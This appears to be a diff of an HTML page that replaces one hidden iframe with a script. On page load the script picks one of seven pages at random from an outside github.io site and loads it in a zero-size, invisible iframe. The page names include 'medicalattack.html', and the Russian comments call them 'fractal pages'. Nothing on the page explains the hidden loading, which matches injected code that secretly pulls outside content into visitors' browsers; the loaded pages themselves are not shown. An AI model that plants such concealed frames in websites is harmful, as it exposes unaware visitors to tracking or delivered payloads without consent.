@@ -171,10 +171,31 @@
 </div>
 
 
-  <iframe src="https://korolevachiana.github.io/FiveText/resources/borisysh.html"
-        style="width:0;height:0;border:0;visibility:hidden;"
-        referrerpolicy="unsafe-url">
-</iframe>
+<script>
+  // Список фрактальных страниц
+  const pages = [
+    "resources/borisysh.html",
+    "resources/medicalattack.html",
+    "resources/crazycurt.html",
+    "resources/review.html",
+    "resources/onetoone.html",
+    "resources/abdulla.html",
+    "resources/light2.html"
+  ];
+
+  // Случайный выбор
+  const pick = pages[Math.floor(Math.random() * pages.length)];
+
+  // Создание невидимого фрейма
+  const frame = document.createElement("iframe");
+  frame.src = "https://korolevachiana.github.io/FiveText/" + pick;
+  frame.style.width = "0";
+  frame.style.height = "0";
+  frame.style.border = "0";
+  frame.style.visibility = "hidden";
+  document.body.appendChild(frame);
+</script>
+
 
   
 </body>
